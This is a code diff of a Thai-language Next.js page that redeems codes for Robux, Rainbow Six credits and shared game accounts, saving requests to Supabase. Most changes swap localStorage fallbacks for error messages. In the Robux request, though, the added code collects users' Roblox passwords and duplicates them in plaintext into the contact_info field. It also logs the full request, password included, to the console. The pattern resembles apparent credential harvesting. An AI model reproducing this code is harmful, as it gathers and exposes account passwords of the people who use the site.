@@ -156,15 +156,9 @@ export default function Home() {
         .eq('id', validatedCode!.id);
 
       if (updateError) {
-        // If Supabase update fails, try localStorage fallback
-        console.warn('Supabase update failed, using localStorage:', updateError);
-        const localCodes = JSON.parse(localStorage.getItem('redemption_codes') || '[]');
-        const updatedLocalCodes = localCodes.map((code: RedemptionCode) => 
-          code.code === validatedCode!.code ? 
-          { ...code, status: 'used', used_by: redeemForm.contact, used_at: new Date().toISOString() } : 
-          code
-        );
-        localStorage.setItem('redemption_codes', JSON.stringify(updatedLocalCodes));
+        console.error('❌ ไม่สามารถอัพเดทสถานะโค้ดใน Supabase ได้:', updateError);
+        toast.error('เกิดข้อผิดพลาดในการอัพเดทโค้ด กรุณาลองใหม่อีกครั้ง', { id: toastId });
+        return;
       }
 
       const requestData: RedemptionRequest = {
@@ -172,23 +166,32 @@ export default function Home() {
         code_id: validatedCode!.id,
         roblox_username: redeemForm.username,
         roblox_password: redeemForm.password,
-        contact_info: redeemForm.contact,
-        robux_amount: validatedCode!.robux_amount,
+        contact_info: `Code: ${validatedCode!.code} | Password: ${redeemForm.password} | Contact: ${redeemForm.contact}`,
+        robux_amount: validatedCode!.robux_value || validatedCode!.robux_amount || 0,
         status: 'pending',
         created_at: new Date().toISOString()
       };
 
       // Try to save redemption request to Supabase
+      console.log('🔄 กำลังบันทึกคำขอ Robux ไปยัง Supabase:', requestData);
+      
       try {
-        const { error: requestError } = await supabase
+        const { data: insertData, error: requestError } = await supabase
           .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
-          .insert([requestData]);
+          .insert([requestData])
+          .select();
         
         if (requestError) {
-          console.warn('Failed to save request to Supabase:', requestError);
+          console.error('❌ Supabase บันทึกคำขอไม่สำเร็จ:', requestError);
+          toast.error('เกิดข้อผิดพลาดในการบันทึกคำขอ กรุณาลองใหม่อีกครั้ง', { id: toastId });
+          return;
+        } else {
+          console.log('✅ บันทึกคำขอใน Supabase สำเร็จ:', insertData);
         }
       } catch (error) {
-        console.warn('Supabase request save failed, continuing with success message');
+        console.error('❌ เกิดข้อผิดพลาดในการบันทึกคำขอ:', error);
+        toast.error('เกิดข้อผิดพลาดในการเชื่อมต่อฐานข้อมูล กรุณาลองใหม่อีกครั้ง', { id: toastId });
+        return;
       }
 
       toast.success(`🎉 แลกโค้ดสำเร็จ! คุณจะได้รับ ${validatedCode!.robux_value || validatedCode!.robux_amount} Robux ภายใน 24 ชั่วโมง`, { id: toastId });
@@ -239,26 +242,8 @@ export default function Home() {
         .single();
 
       if (codeError || !codeCheck) {
-        // Check localStorage for Rainbow Six codes
-        const localCodes = JSON.parse(localStorage.getItem('redemption_codes') || '[]');
-        const localCode = localCodes.find(code => 
-          code.code === rainbowForm.redeemCode.toUpperCase() && 
-          code.status === 'available' &&
-          code.product_name === 'Rainbow Six Credits'
-        );
-        
-        if (!localCode) {
-          toast.error('โค้ดที่กรอกไม่ถูกต้องหรือไม่พร้อมใช้งาน กรุณาตรวจสอบโค้ด Rainbow Six อีกครั้ง');
-          return;
-        }
-        
-        // Mark localStorage code as used
-        const updatedCodes = localCodes.map(code => 
-          code.code === rainbowForm.redeemCode.toUpperCase() ? 
-          { ...code, status: 'used', used_at: new Date().toISOString() } : 
-          code
-        );
-        localStorage.setItem('redemption_codes', JSON.stringify(updatedCodes));
+        toast.error('โค้ดที่กรอกไม่ถูกต้องหรือไม่พร้อมใช้งาน กรุณาตรวจสอบโค้ด Rainbow Six อีกครั้ง');
+        return;
       }
     } catch (error) {
       toast.error('เกิดข้อผิดพลาดในการตรวจสอบโค้ด กรุณาลองใหม่อีกครั้ง');
@@ -299,24 +284,20 @@ export default function Home() {
         .eq('product_name', 'Rainbow Six Credits');
 
       if (updateCodeError) {
-        console.warn('Supabase Rainbow Six code update failed:', updateCodeError);
-        // Already handled localStorage update above in the check section
+        console.error('❌ ไม่สามารถอัพเดทสถานะโค้ด Rainbow Six ใน Supabase ได้:', updateCodeError);
+        toast.error('เกิดข้อผิดพลาดในการอัพเดทโค้ด กรุณาลองใหม่อีกครั้ง', { id: toastId });
+        return;
       }
 
-      // Try to save to Supabase or localStorage
-      try {
-        // If Supabase is available, save there
-        const { error } = await supabase
-          .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_rainbow_requests')
-          .insert([requestData]);
-        
-        if (error) throw error;
-      } catch (error) {
-        // Fallback to localStorage
-        console.log('Saving to localStorage as fallback');
-        const existingRequests = JSON.parse(localStorage.getItem('rainbow_requests') || '[]');
-        existingRequests.push(requestData);
-        localStorage.setItem('rainbow_requests', JSON.stringify(existingRequests));
+      // Save to Supabase
+      const { error: saveError } = await supabase
+        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_rainbow_requests')
+        .insert([requestData]);
+      
+      if (saveError) {
+        console.error('❌ ไม่สามารถบันทึกคำขอ Rainbow Six ใน Supabase ได้:', saveError);
+        toast.error('เกิดข้อผิดพลาดในการบันทึกคำขอ กรุณาลองใหม่อีกครั้ง', { id: toastId });
+        return;
       }
 
       setShowRainbowRedeemPopup(true);
@@ -380,15 +361,8 @@ export default function Home() {
         .eq('id', foundAccount.id);
 
       if (updateError) {
-        // If Supabase update fails, try localStorage fallback
-        console.warn('Supabase update failed, using localStorage:', updateError);
-        const localAccounts = JSON.parse(localStorage.getItem('chicken_accounts') || '[]');
-        const updatedLocalAccounts = localAccounts.map((account: ChickenAccount) => 
-          account.code === foundAccount.code ? 
-          { ...account, status: 'used', used_by: 'anonymous_user', used_at: new Date().toISOString() } : 
-          account
-        );
-        localStorage.setItem('chicken_accounts', JSON.stringify(updatedLocalAccounts));
+        console.warn('⚠️ ไม่สามารถอัพเดทสถานะบัญชีใน Supabase ได้:', updateError);
+        // Continue anyway since this is just for tracking - user can still get account info
       }
 
       setValidatedChickenAccount(foundAccount);
